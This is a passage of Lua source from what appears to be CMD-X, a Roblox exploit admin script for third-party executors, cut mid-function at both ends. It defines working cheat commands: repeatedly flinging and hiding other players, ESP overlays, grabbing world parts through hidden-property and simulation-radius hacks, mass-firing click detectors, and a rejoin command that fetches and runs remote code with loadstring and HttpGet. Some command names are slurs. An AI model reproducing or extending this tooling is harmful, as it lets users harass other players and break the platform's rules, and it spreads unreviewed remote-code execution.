		elseif CMDS.aliases[arguments[2]] then
			cmdinfo.description = CMDS.commands[CMDS.aliases[arguments[2]]]
			cmdinfo.name = CMDS.aliases[arguments[2]]
			cmdinfo.usage = CMDS.usage[CMDS.aliases[arguments[2]]]
		end
		if not cmdinfo.description or not cmdinfo.name then
			opx("*","Invalid command "..arguments[2]..".")
			return
		end
		if not cmdinfo.usage then
			cmdinfo.usage = "()"
		end
		opxL("Command","."..cmdinfo.name.." | "..cmdinfo.usage.." "..cmdinfo.description)
	end

	Pxrts = {}
	function useCommand.truesight()
		opx("-","Truesight is now on")
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") and v.Transparency == 1 then
				v.Transparency = 0
				Pxrts[#Pxrts+1] = v
			end
		end
	end

	LoopFling = false
	function useCommand.loopfling()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				while LoopFling do
					arguments = {"fling",target.Name}
					useCommand.fling()
					repeat wait(.1) until target.Character ~= nil and target.Character:FindFirstChild('HumanoidRootPart')
				end
			else
				opx("*","Player does not exist!")    
			end
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.unloopfling()
		opx("-","Stopped loop flinging")
		LoopFling = false
	end

	function useCommand.nomouse()
		opx("-","Mouse disabled, use ; to focus back on the CMDbar")
		cmduis.MouseIconEnabled = false
	end

	function useCommand.yesmouse()
		opx("-","Mouse enabled")
		cmduis.MouseIconEnabled = true
	end

	function useCommand.untruesight()
		opx("-","Truesight is now off")
		for i,v in pairs(Pxrts) do
			v.Transparency = 1
		end
	end

	local PDisabled = {}
	function useCommand.disableplayer()
		if arguments[2] then
			local target = findplr(arguments[2])
			if target then
				target.Character.Head.face.Transparency = 1
				opx("-","Disabled "..target.Name)
				PDisabled[#PDisabled+1] = target
				local UserNum = #PDisabled
				for i,v in pairs(target.Character:GetDescendants()) do
					if v:IsA("BasePart") then
						v.Transparency = 1
					end
				end
				target.CharacterAdded:Connect(function(Character)
					if PDisabled[UserNum] ~= nil then
						for i,v in pairs(Character:GetDescendants()) do
							if v:IsA("BasePart") then
								v.Transparency = 1
							end
						end
					end
				end)
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.enableplayer()
		if arguments[2] then
			local target = findplr(arguments[2])
			if target then
				target.Character.Head.face.Transparency = 0
				opx("-","Enabled "..target.Name)
				for i,v in pairs(target.Character:GetDescendants()) do
					if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
						v.Transparency = 0
					end
				end
				for i,v in pairs(PDisabled) do
					if target == PDisabled[i] then
						table.remove(PDisabled,i)
					end
				end
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.gotopart()
		if arguments[2] then
			for i,v in pairs(workspace:GetDescendants()) do
				if v.Name == getstring(2) then
					opx("-","Teleported to part")
					cmdlp.Character.Humanoid.Jump = true
					cmdlp.Character.HumanoidRootPart.CFrame = v.CFrame
					break
				end
			end
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.clientbringpart()
		if arguments[2] then
			for i,v in pairs(workspace:GetDescendants()) do
				if v.Name == getstring(2) then
					opx("-","Brought part")
					v.CFrame = cmdlp.Character.HumanoidRootPart.CFrame
					break
				else
					opx("*","Part does not exist")
				end
			end
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.clientdeletepart()
		if arguments[2] then
			local broke = false
			for i,v in pairs(workspace:GetDescendants()) do
				if v.Name == getstring(2) then
					v:Destroy()
					broke = true
					break
				end
			end
			if not broke then
				opx("*","Part does not exist")
				return
			end
			opx("-","Deleted part")
			return
		end
		opx("*","2 arguments are required!")
	end

	function useCommand.copyoutput()
		if cmdnum(arguments[3]) then
			local start = arguments[2]
			local breaker = arguments[3]
			setclipboard(output1.Text:sub(start,breaker))
			opx("-","Copied latest output")
		else
			setclipboard(output1.Text)
			opx("-","Copied latest output")
		end
	end

	function useCommand.copypath()
		if arguments[2] then
			for i,v in pairs(workspace:GetDescendants()) do
				if v.Name == getstring(2) then
					opx("-","Copied path of part")
					setclipboard(v:GetFullName())
					break
				else
					opx("*","Part does not exist")
				end
			end
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.outputbind()
		if arguments[2] == "chat" then
			ChatBind = true
			updatesaves()
			opx("-","Output switched to chat")
		elseif arguments[2] == "default" then
			ChatBind = false
			updatesaves()
			opx("-","Output switched to default")
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.clearwaves()
		opx("-","Made all waves clear")
		workspace.Terrain.WaterReflectance = 0
		workspace.Terrain.WaterTransparency = 1
		workspace.Terrain.WaterColor = Color3.fromRGB(255,255,255)
	end

	function useCommand.calmwaves()
		opx("-","Made all waves calm")
		workspace.Terrain.WaterWaveSize = 0
		workspace.Terrain.WaterWaveSpeed = 10
	end

	function useCommand.fov()
		if cmdnum(arguments[2]) then
			workspace.Camera.FieldOfView = arguments[2]
			opx("-","Set field of view to "..arguments[2])
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.volume()
		if cmdnum(arguments[2]) then
			opx("-","System Volume is now "..arguments[2])
			UserSettings():GetService("UserGameSettings").MasterVolume = arguments[2]/100
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.graphics()
		if cmdnum(arguments[2]) then
			opx("-","System Graphics is now "..arguments[2])
			settings().Rendering.QualityLevel = arguments[2]
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.mousesensitivity()
		if cmdnum(arguments[2]) then
			opx("-","Changed mouse sensitivity to "..arguments[2])
			cmduis.MouseDeltaSensitivity = arguments[2]
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.animspeed()
		if arguments[2] then
			opx("-","Sped up animations")
			for i,v in pairs(cmdlp.Character.Humanoid:GetPlayingAnimationTracks()) do
				v:AdjustSpeed(arguments[2])
			end
		else
			opx("-","2 arguments are required!")
		end
	end

	NoPrompt = nil
	function useCommand.noprompt()
		opx("-","No prompt enabled")
		NoPrompt = game:GetService("CoreGui").PurchasePromptApp.ProductPurchase.ChildAdded:Connect(function(v) 
			v:Destroy() 
		end)
	end

	function useCommand.yesprompt()
		opx("-","No prompt disabled")
		NoPrompt:Disconnect()
		NoPrompt = nil
	end

	function useCommand.rappu()
		if arguments[2] then
			local target = findplr(arguments[2])
			if target then
				local URL = ("https://inventory.roblox.com/v1/users/"..target.UserId.."/assets/collectibles?sortOrder=Asc&limit=100")
				local fuck = game:HttpGet(URL)
				local Http = game:GetService("HttpService"):JSONDecode(fuck)
				local RAP = 0
				function ListItems(Look)
					for i,v in pairs(Look.data) do
						if v.recentAveragePrice ~= nil then
							RAP = RAP+v.recentAveragePrice
						end
					end
				end
				ListItems(Http)
				Pages = 1
				for i = 1,500 do
					if Http.nextPageCursor ~= null then
						local fuck = game:HttpGet(URL.."&cursor="..Http.nextPageCursor)
						Http = game:GetService("HttpService"):JSONDecode(fuck)
						ListItems(Http)
						Pages = Pages+1
					else
						cmdrs.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(target.Name.." has "..RAP.."RAP, "..Pages.."pgs checked","All")
						opx("-",target.Name.." has "..RAP.."RAP, "..Pages.."pgs checked")
						break
					end
				end
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.rappr()
		if arguments[2] then
			local target = findplr(arguments[2])
			if target then
				local URL = ("https://inventory.roblox.com/v1/users/"..target.UserId.."/assets/collectibles?sortOrder=Asc&limit=100")
				local fuck = game:HttpGet(URL)
				local Http = game:GetService("HttpService"):JSONDecode(fuck)
				local RAP = 0
				function ListItems(Look)
					for i,v in pairs(Look.data) do
						if v.recentAveragePrice ~= nil then
							RAP = RAP+v.recentAveragePrice
						end
					end
				end
				ListItems(Http)
				Pages = 1
				for i = 1,500 do
					if Http.nextPageCursor ~= null then
						local fuck = game:HttpGet(URL.."&cursor="..Http.nextPageCursor)
						Http = game:GetService("HttpService"):JSONDecode(fuck)
						ListItems(Http)
						Pages = Pages+1
					else
						opx("-",target.Name.." has "..RAP.."RAP, "..Pages.."pgs checked")
						break
					end
				end
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are required!")
		end
	end

	PGUI = {}
	function useCommand.noguis()
		opx("-","No guis enabled")
		for i,v in pairs(cmdlp.PlayerGui:GetDescendants()) do
			if v:IsA("Frame") and v.Visible == true then
				v.Visible = false
				PGUI[#PGUI+1] = v
			end
		end
	end

	function useCommand.yesguis()
		opx("-","No guis disabled")
		for i,v in pairs(PGUI) do
			v.Visible = true
		end
	end

	GTS = {}
	function useCommand.guitruesight()
		opx("-","Gui truesight enabled")
		for i,v in pairs(cmdlp.PlayerGui:GetDescendants()) do
			if v:IsA("Frame") and v.Visible == false then
				v.Visible = true
				GTS[#GTS+1] = v
			end
		end
	end

	function useCommand.unguitruesight()
		opx("-","Gui truesight disabled")
		for i,v in pairs(GTS) do
			v.Visible = false
		end
	end

	BGs = {}
	function useCommand.nobillboardguis()
		opx("-","Turned off all billboardguis")
		YesBgs = true
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BillboardGui") or v:IsA("SurfaceGui") then
				v.Enabled = false
				BGs[#BGs+1] = v
			end
		end
	end

	function useCommand.yesbillboardguis()
		opx("-","Turned on all billboardguis")
		for i,v in pairs(BGs) do
			v.Enabled = true
		end
	end

	function useCommand.grippos()
		if not cmdnum(arguments[4]) then
			opx("*","4 arguments are required!")
			return
		end
		local tool = cmdlp.Character:FindFirstChildOfClass("Tool")
		tool.Parent = cmdlp.Backpack
		tool.GripPos = Vector3.new(arguments[2],arguments[3],arguments[4])
		tool.Parent = cmdlp.Character
		opx("-","Set GripPos")
	end

	SWs = false
	function useCommand.shiftwalkspeed()
		if cmdnum(arguments[2]) then
			opx("-","Shift walkspeed enabled")
			SWs = true
			cmduis.InputBegan:Connect(function(input)
				if SWs == true and cmduis:IsKeyDown(Enum.KeyCode.LeftShift) then
					cmdlp.Character.Humanoid.WalkSpeed = arguments[2]
				end
			end)
			cmdm.KeyUp:connect(function(key)
				if SWs == true and key == "0" then
					cmdlp.Character.Humanoid.WalkSpeed = 16
				end
			end)
		else
			opx("-","Shift walkspeed enabled")
			SWs = true
			cmduis.InputBegan:Connect(function(input)
				if SWs == true and cmduis:IsKeyDown(Enum.KeyCode.LeftShift) then
					cmdlp.Character.Humanoid.WalkSpeed = permwalkspeed
				end
			end)
			cmdm.KeyUp:connect(function(key)
				if SWs == true and key == "0" then
					cmdlp.Character.Humanoid.WalkSpeed = 16
				end
			end)
		end
	end

	function useCommand.unshiftwalkspeed()
		opx("-","Shift walkspeed disabled")
		SWs = false
		cmdlp.Character.Humanoid.WalkSpeed = 16
	end

	function useCommand.noresult()
		output1.Text = output2.Text
		output2.Text = output3.Text
		output3.Text = output4.Text
		output4.Text = output5.Text
		output5.Text = output6.Text
		output6.Text = output7.Text
		output7.Text = output8.Text
		output8.Text = output9.Text
	end

	local bAe = Instance.new("Animation")
	bAe.AnimationId = "rbxassetid://259438880"
	local cAe = Instance.new("Animation")
	cAe.AnimationId = "rbxassetid://181526230"
	local dAe = Instance.new("Animation")
	dAe.AnimationId = "rbxassetid://33796059"
	function useCommand.retard()
		if arguments[2] == "1" then
			if btAe then btAe:Stop() end
			if ctAe then ctAe:Stop() end
			if dtAe then dtAe:Stop() end
			btAe = cmdlp.Character.Humanoid:LoadAnimation(bAe)
			btAe:Play(.1, 1, 1e3)
		elseif arguments[2] == "2" then
			if btAe then btAe:Stop() end
			if ctAe then ctAe:Stop() end
			if dtAe then dtAe:Stop() end
			ctAe = cmdlp.Character.Humanoid:LoadAnimation(cAe)
			ctAe:Play(.1, 1, 1)
			dtAe = cmdlp.Character.Humanoid:LoadAnimation(dAe)
			dtAe:Play(.1, 1, 1e8)
		else
			if btAe then btAe:Stop() end
			if ctAe then ctAe:Stop() end
			if dtAe then dtAe:Stop() end
			btAe = cmdlp.Character.Humanoid:LoadAnimation(bAe)
			btAe:Play(.1, 1, 1e3)
			useCommand.spin()
		end
		opx("-","Now being a retard")
	end

	function useCommand.unretard()
		if btAe then btAe:Stop() useCommand.unspin() end
		if ctAe then ctAe:Stop() end
		if dtAe then dtAe:Stop() end
		opx("-","Stopped being a retard")
	end

	xAnchored = {}
	xOrig = {}

	function grabUnanchored(Model)
		for i,part in pairs(Model:GetDescendants()) do
			if part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and part:IsDescendantOf(cmdlp.Character) == false then
				part.Massless = true
				part.CanCollide = false
				if part:FindFirstChildOfClass("BodyPosition") == nil then
					local mover = Instance.new("BodyPosition", part)
					table.insert(xAnchored, mover)
					xOrig[#xOrig+1] = {pos = mover.Position, par = mover}
					mover.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
				else
					part.BodyPosition:Destroy()
					local mover = Instance.new("BodyPosition", part)
					table.insert(xAnchored, mover)
					xOrig[#xOrig+1] = {pos = mover.Position, par = mover}
					mover.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
				end
			end
		end
	end

	IHaveSimmed = false
	function useCommand.simulationradius()
		sethiddenproperty = sethiddenproperty or set_hidden_prop
		setsimulationradius = setsimulationradius or set_simulation_radius
		if not sethiddenproperty then
			opx("*","sethiddenproperty is not supported on your executor!")
			return
		end
		IHaveSimmed = true
		if setsimulationradius then
			setsimulationradius(1e308,1/0)
		else
			sethiddenproperty(cmdlp,"MaximumSimulationRadius",1/0)
			sethiddenproperty(cmdlp,"SimulationRadius",1e308)
		end
	end

	IHaveGrabbed = false
	function useCommand.grabunanchored()
		if not IHaveSimmed then
			opx("*",".simulationradius is required!")
			return
		end
		IHaveGrabbed = true
		if arguments[2] then
			opx("-","Updated anchored parts list from "..arguments[2])
			for i,v in pairs(worksapce:GetDescendants()) do
				if v.Name == arguments[2] then
					UnanchoredPart = v.Name
					break
				end
			end
			grabUnanchored(UnanchoredPart)
		else
			opx("-","Updated anchored parts list from workspace")
			grabUnanchored(workspace)
		end
	end

	lookingAt = false
	function useCommand.lookat()
		if not arguments[2] then
			opx("*","2 arguments are required!")
			return
		end
		target = findplr(arguments[2])
		if not target then
			opx("*","Player does not exist!")
			return
		end
		opx("-","Now looking at "..target.Name)
		lookingAt = true
		repeat game:GetService("RunService").Heartbeat:Wait()
			cmdlp.Character.HumanoidRootPart.CFrame = CFrame.new(cmdlp.Character.HumanoidRootPart.Position, target.Character.HumanoidRootPart.Position)
		until lookingAt == false
	end

	function useCommand.unlookat()
		opx("-","Stopped looking at")
		lookingAt = false
	end

	function useCommand.setbackunanchored()
		if not IHaveGrabbed then
			opx("*",".grabunanchored is required!")
			return
		end
		opx("-","Set back unanchored parts")
		for i,v in pairs(xOrig) do
			if xAnchored[i] ~= nil then
				xOrig[i].par.Position = target.Character:FindFirstChild("HumanoidRootPart").CFrame:PointToWorldSpace(xOrig[i].pos)
			end
		end
	end

	function useCommand.clearunanchored()
		xAnchored = {}
		opx("-","Cleared unanchored parts list")
	end

	function useCommand.bringunanchored()
		if not IHaveGrabbed then
			opx("*",".grabunanchored is required!")
			return
		end
		if not arguments[2] then
			opx("*","2 arguments are required!")
			return
		end
		target = findplr(arguments[2])
		if not target then
			opx("*","Player does not exist!")
			return
		end
		opx("-","Brung unanchored parts")
		for i,v in pairs(xAnchored) do
			if xAnchored[i] ~= nil then
				xAnchored[i].Position = target.Character:FindFirstChild("HumanoidRootPart").CFrame:PointToWorldSpace(Vector3.new(gotoPosSide,gotoPosHead,gotoPos))
			end
		end
	end

	function useCommand.removeunanchored()
		if not IHaveGrabbed then
			opx("*",".grabunanchored is required!")
			return
		end
		opx("-","Removed unanchored parts")
		for i,v in pairs(xAnchored) do
			if xAnchored[i] ~= nil then
				xAnchored[i].Position = target.Character:FindFirstChild("HumanoidRootPart").CFrame:PointToWorldSpace(Vector3.new(0,-500,0))
			end
		end
	end

	local fullCircle = 2 * math.pi
	local radius = 10
	function getXAndZPositions(angle)
		local x = math.cos(angle) * radius
		local z = math.sin(angle) * radius
		return x, z
	end

	ActUp = {}
	SpinningFor = false
	function useCommand.spinunanchored()
		if not IHaveGrabbed then
			opx("*",".grabunanchored is required!")
			return
		end
		if not arguments[2] then
			opx("*","2 arguments are required!")
			return
		end
		ActUp = {}
		opx("-","Spinning unanchored parts")
		SpinningFor = true
		iffy = arguments[2]
		normspin = 0
		function RotatePointAtDist(Point, Angle, Dist)
			local Rotation = CFrame.Angles(0, math.rad(Angle),0)
			return (CFrame.new(Point) *  Rotation * CFrame.new(0,0,Dist)).Position
		end
		for i,v in pairs(xAnchored) do
			normspin = normspin + 30
			xAnchored[i].Position = RotatePointAtDist(cmdlp.Character.HumanoidRootPart.Position, normspin, iffy)
			ActUp[#ActUp+1] = normspin
		end
		game:GetService("RunService").RenderStepped:Connect(function()
			if SpinningFor == true then
				for i,v in pairs(xAnchored) do
					xAnchored[i].Position = RotatePointAtDist(cmdlp.Character.HumanoidRootPart.Position, ActUp[i]-.1, iffy)
					ActUp[i] = ActUp[i]-.1
				end
			end
		end)
	end

	function useCommand.unspinunanchored()
		opx("-","Stopped spinning unanchored parts")
		SpinningFor = false
	end

	function useCommand.animationsteal()
		if not arguments[2] then
			opx("*","2 arguments are required!")
			return
		end
		if not cmd15(cmdlp) then
			opx("*","R15 is required!")
			return
		end
		local target = findplr(arguments[2])
		if not target then
			opx("*","Player does not exist!")
			return
		end
		if not cmd15(target) then
			opx("*",target..", R15 is required!")
			return
		end
		if target.Character:FindFirstChild("Animate") then
			if cmdlp.Character:FindFirstChild("Animate") then
				checkifmyanim = cmdlp.Character:FindFirstChild("animstorage")
				if checkifmyanim then
					local z = cmdlp.Character:FindFirstChild("Animate")
					if z then z:Destroy() end
					checkifmyanim.Name = "Animate"
					checkifmyanim.Disabled = false
				end
			end
			local z = cmdlp.Character:FindFirstChild("Animate")
			if z then
				z.Name = "animstorage"
				z.Disabled = true
			end
			local newanim = target.Character.Animate:Clone()
			newanim.Parent = cmdlp.Character
			newanim.Name = "Animate"
			opx("-","Stole "..target.Name.."'s animations")
		else
			opx("*","Target is missing proper animations.")
		end
	end

	function useCommand.unanimationsteal()
		if not cmd15(cmdlp) then
			opx("*","R15 is required!")
			return
		end
		if cmdlp.Character:FindFirstChild("animstorage") then
			if cmdlp.Character:FindFirstChild("Animate") then
				cmdlp.Character:FindFirstChild("Animate"):Destroy()
			end
			local as = cmdlp.Character:FindFirstChild("animstorage")
			as.Name = "Animate"
			as.Disabled = false
			opx("-","Animations reverted to normal.")
		else
			opx("*","Animations haven't been stolen!")
		end
	end

	function useCommand.nohurtoverlay()
		opx("-","Turned off hurt overlay")
		hurtOverlay = true
		game:GetService("CoreGui").TopBar.FullScreenFrame.HurtOverlay:GetPropertyChangedSignal("Visible"):Connect(function()
			if hurtOverlay == true then
				game:GetService("CoreGui").TopBar.FullScreenFrame.HurtOverlay.Visible = false
			end
		end)
	end

	function useCommand.yeshurtoverlay()
		opx("-","Turned on hurt overlay")
		hurtOverlay = false
	end

	function useCommand.atmosphere()
		if arguments[2] then
			opx("-","Set Atmosphere to "..arguments[2])
			local atmsky = Instance.new("Sky",cmdl)
			local atm = Instance.new("Atmosphere",cmdl)
			atm.Density = arguments[2]
		else
			opx("-","Set Atmosphere to 1")
			local atmsky = Instance.new("Sky",cmdl)
			local atm = Instance.new("Atmosphere",cmdl)
			atm.Density = 1
		end
	end

	function useCommand.unatmosphere()
		opx("-","Removed atmosphere")
		local atm = cmdl.Atmosphere
		atm:Destroy()
	end

	function useCommand.removefx()
		opx("-","Removed FX")
		for i,v in pairs(cmdl:GetDescendants()) do
			if v:IsA("Atmosphere") or v:IsA("SunRaysEffect") or v:IsA("BloomEffect") or v:IsA("BlurEffect") then
				v:Destroy()
			end
		end
	end

	Chaos = false
	function useCommand.chaos()
		local chaosspeed = arguments[2]
		Chaos = true
		opx("-","Chaos mode is now on")
		while Chaos do
			local x = 1
			local outputx = math.random(1,600)
			for i,_ in pairs(CMDS.commands) do
				x = x + 1
				if x == outputx then
					if i ~= "exit" and i ~= "rejoin" and i ~= "rejoindiff" and i ~= "fuckoff" and i ~= "quickexit" then
						if i:sub(1,2) ~= "un" and i:sub(1,3) ~= "yes" then
							arguments = i:split(" ")
							opx("-",i.." use .? (cmd) for more info")
							pcall(function() useCommand[i]() end)
						end
					end
				end
			end
			wait(chaosspeed)
		end
	end	
	function useCommand.unchaos()
		opx("-","Chaos mode is now off")
		Chaos = false
	end

	function useCommand.gotofreecam()
		opx("-","Teleported to freecam")
		cmdlp.Character.HumanoidRootPart.CFrame = workspace.Camera.CFrame
	end

	function useCommand.noclaim()
		opx("-","Turned on noclaim")
		DHSaved = workspace.FallenPartsDestroyHeight
		workspace.FallenPartsDestroyHeight = math.huge - math.huge
	end

	function useCommand.yesclaim()
		opx("-","Turned off noclaim")
		workspace.FallenPartsDestroyHeight = DHSaved
	end

	function useCommand.destroyheight()
		if not cmdnum(arguments[2]) then
			opx("*","2 arguments are required!")
			return
		end
		opx("-","Set destroyheight to "..arguments[2])
		workspace.FallenPartsDestroyHeight = arguments[2]
	end

	TrackN = false

	function CreateN(xPlayer, xHead)
		local ESP = Instance.new("BillboardGui", cmdlp.PlayerGui)
		local ESPSquare = Instance.new("Frame", ESP)
		local ESPText = Instance.new("TextLabel", ESP)
		ESP.Name = "ESPN"..xPlayer.Name
		ESP.Adornee = xHead
		ESP.AlwaysOnTop = true
		ESP.ExtentsOffset = Vector3.new(0, 1, 0)
		ESP.Size = UDim2.new(0, 5, 0, 5)
		ESPText.Name = "NAME"
		ESPText.BackgroundColor3 = Color3.new(255, 255, 255)
		ESPText.BackgroundTransparency = 1
		ESPText.BorderSizePixel = 0
		ESPText.Position = UDim2.new(0, 0, 0, -40)
		ESPText.Size = UDim2.new(1, 0, 10, 0)
		ESPText.Visible = true
		ESPText.ZIndex = 10
		ESPText.Font = Enum.Font.SourceSansSemibold
		ESPText.TextStrokeTransparency = 0.6
		ESPText.TextSize = 20
		ESPText.Text = xPlayer.Name
		ESPText.TextColor = xPlayer.TeamColor
	end

	function ClearN()
		for _,v in pairs(cmdlp.PlayerGui:GetChildren()) do
			if v.Name:sub(1,4) == "ESPN" and v:IsA("BillboardGui") then
				v:Destroy()
			end
		end
	end

	function FindN()
		ClearN()
		TrackN = true
		while wait() do
			if TrackN then
				ClearN()
				for i,v in pairs(cmdp:GetPlayers()) do
					if v ~= cmdlp then
						if v.Character and v.Character:FindFirstChild("Head") then
							CreateN(v, v.Character.Head, true)
						end
					end
				end
			end
			wait(1)
		end
	end

	local ESPNEnabled = false
	function useCommand.nameesp()
		opx("-","Name ESP Enabled")
		FindN()
		ESPNEnabled = true
		repeat
			wait()
			if ESPNEnabled == true then
				FindN()
			end
		until ESPNEnabled == false
	end

	function useCommand.unnameesp()
		opx("-","Name ESP Disabled")
		ESPNEnabled = false
		TrackN = false
		for i = 1,10 do
			ClearN()
			wait()
		end
	end

	function useCommand.spectatepart()
		if not arguments[2] then
			opx("*","2 arguments are required!")
			return
		end
		for i,v in pairs(workspace:GetDescendants()) do
			if v.Name == getstring(2) then
				opx("-","Now viewing part")
				workspace.CurrentCamera.CameraSubject = v
				break
			end
		end
	end

	function useCommand.rejoinexecute()
		if not syn.queue_on_teleport then
			opx("*","queue_on_teleport is not supported on your executor!")    
		end
		rejoining = true
		syn.queue_on_teleport([[
		game:GetService('ReplicatedFirst'):RemoveDefaultLoadingScreen()
		repeat wait(.1) until game:GetService('Players').LocalPlayer
		loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
	]])
		opx("-","Rejoining game")
		game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, cmdp)
		wait(3)
		rejoining = false
	end

	function useCommand.newaudios()
		local URL = ("https://search.roblox.com/catalog/json?CatalogContext=2&Category=9&SortType=3&IncludeNotForSale=true&ResultsPerPage=")
		if not arguments[2] then arguments[2] = "10" end
		local fuck = game:HttpGet(URL..arguments[2])
		local Http = game:GetService("HttpService"):JSONDecode(fuck)
		xIds = ""
		for i,v in pairs(Http) do
			xIds = xIds..v.AssetId.."\n"
		end
		opxL("Newest-IDs",xIds)
		opx("Listed new audios")
	end

	function useCommand.randomcmd()
		local x = 1
		local outputx = math.random(1,600)
		for i,_ in pairs(CMDS.commands) do
			x = x + 1
			if x == outputx then
				if i ~= "exit" and i ~= "rejoin" and i ~= "rejoindiff" and i ~= "fuckoff" and i ~= "quickexit" then
					if i:sub(1,2) ~= "un" and i:sub(1,3) ~= "yes" then
						arguments = i:split(" ")
						opx("-",i.." use .? (cmd) for more info")
						pcall(function() useCommand[i]() end)
					end
				end
			end
		end
	end

	function useCommand.replayintro()
		opx("-","Replaying intro")
		local Sound2 = Instance.new("Sound",game:GetService("Lighting"))
		Sound2.SoundId = "http://www.roblox.com/asset/?id="..5032588119
		Sound2:Play()
		wait(2.638)
		Sound2:Destroy()
	end

	function useCommand.masscmd()
		opx("-","Executing CMDs")
		table.remove(arguments,1)
		for i,v in pairs(arguments) do
			useCommand[arguments[i]]()
		end
	end

	function useCommand.mass()
		opx("-","Executing player command in mass")
		FinalCMD = findCmd(arguments[2])
		for i,v in pairs(cmdp:GetPlayers()) do
			arguments = FinalCMD.." "..v.Name
			arguments = arguments:split(" ")
			useCommand[FinalCMD]()
		end
	end

	function FindPart(Name)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.Name == Name then
				return v
			end
		end
	end

	function useCommand.touchinterests()
		opx("-","Fired touch interests")
		if arguments[2] then
			local Part = FindPart(arguments[2])
			for i,v in pairs(Part:GetDescendants()) do
				if v:IsA("TouchInterest") then
					v.Parent.CFrame = cmdlp.Character.HumanoidRootPart.CFrame
				end
			end
		else
			for i,v in pairs(workspace:GetDescendants()) do
				if v:IsA("TouchInterest") then
					v.Parent.CFrame = cmdlp.Character.HumanoidRootPart.CFrame
				end
			end
		end
	end

	function useCommand.singletouchinterest()
		opx("-","Fired touch interest")
		local touch = FindPart(arguments[2])
		touch.Parent.CFrame = cmdlp.Character.HumanoidRootPart.CFrame
	end

	bgMd = {}
	function useCommand.billboardmaxdistance()
		opx("-","All billboards now have max distance")
		for _,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BillboardGui") then
				table.insert(bgMd,{p = v, m = v.MaxDistance, a = v.AlwaysOnTop})
				v.MaxDistance = inf
				v.AlwaysOnTop = true
			end
		end
	end

	function useCommand.unbillboardmaxdistance()
		opx("-","All billboards no longer have max distance")
		for _,v in pairs(bgMd) do
			v.p.MaxDistance = m
			v.p.AlwaysOnTop = a
		end
	end

	bgTs = {}
	function useCommand.billboardtruesight()
		opx("-","All billboards now showing")
		for _,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BillboardGui") then
				table.insert(bgTs,v)
				v.Enabled = true
			end
		end
	end

	function useCommand.unbillboardtruesight()
		opx("-","All billboards no longer showing")
		for _,v in pairs(bgTs) do
			v.Enabled = false
		end
	end

	sgTs = {}
	function useCommand.surfaceguitruesight()
		opx("-","All surface guis now showing")
		for _,v in pairs(workspace:GetDescendants()) do
			if v:IsA("SurfaceGui") then
				table.insert(sgTs,v)
				v.Enabled = true
			end
		end
	end

	function useCommand.unsurfaceguitruesight()
		opx("-","All surface guis no longer showing")
		for _,v in pairs(sgTs) do
			v.Enabled = false
		end
	end

	cdMd = {}
	function useCommand.clickdetectormaxdistance()
		opx("-","All click detectors now have max distance")
		for _,v in pairs(workspace:GetDescendants()) do
			if v:IsA("ClickDetector") then
				table.insert(cdMd,{p = v, m = v.MaxActivationDistance})
				v.MaxActivationDistance = 10000
			end
		end
	end

	function useCommand.unclickdetectormaxdistance()
		opx("-","All click detectors no longer have max distance")
		for _,v in pairs(cdMd) do
			v.p.MaxActivationDistance = m 
		end
	end

	function useCommand.clickdetectors()
		if not fireclickdetector then
			opx("*","fireclickdetector is not supported on your executor!")
			return
		end
		opx("-","Fired click detectors")
		if arguments[2] then
			local Part = FindPart(arguments[2])
			for i,v in pairs(Part:GetDescendants()) do
				if v:IsA("ClickDetector") then
					fireclickdetector(v)
				end
			end
		else
			for i,v in pairs(workspace:GetDescendants()) do
				if v:IsA("ClickDetector") then
					fireclickdetector(v)
				end
			end
		end
	end

	function useCommand.outofbody()
		if not cmd15(cmdlp) then
			opx("*","R15 is required!")
			return
		end
		cmdlp.Character.LowerTorso.Anchored = true
		cmdlp.Character.LowerTorso.Root:Destroy()
		opx("-","You are now out of your body")
	end

	function useCommand.norotate()
		cmdlp.Character.Humanoid.AutoRotate = false
		opx("-","You will no longer rotate")
	end

	function useCommand.yesrotate()
		cmdlp.Character.Humanoid.AutoRotate = true
		opx("-","You will now rotate")
	end

	function useCommand.cameraoffset()
		if not arguments[4] then
			opx("*","4 arguments are needed!")
			return
		end
		cmdlp.Character.Humanoid.CameraOffset = Vector3.new(arguments[2],arguments[3],arguments[4])
		opx("-","Set camera offset to "..arguments[2].." "..arguments[3].." "..arguments[4])
	end

	function useCommand.singleclickdetector()
		if not fireclickdetector then
			opx("*","fireclickdetector is not supported on your executor!")
			return
		end
		opx("-","Fired click detector")
		local touch = FindPart(arguments[2])
		fireclickdetector(touch)
	end

	function useCommand.gotoclass()
		if not arguments[2] then
			opx("*","2 arguments are required!")
			return
		end
		opx("-","Teleported to class part")
		local Part
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA(arguments[2]) then Part = v; break end
		end
		cmdlp.Character.HumanoidRootPart.CFrame = Part.CFrame
	end

	function useCommand.gotobpclass()
		if not arguments[2] then
			opx("*","2 arguments are required!")
			return
		end
		for i,v in pairs(workspace:GetDescendants()) do
			if v.ClassName == getstring(2) then
				opx("-","Bypass Teleported to part")
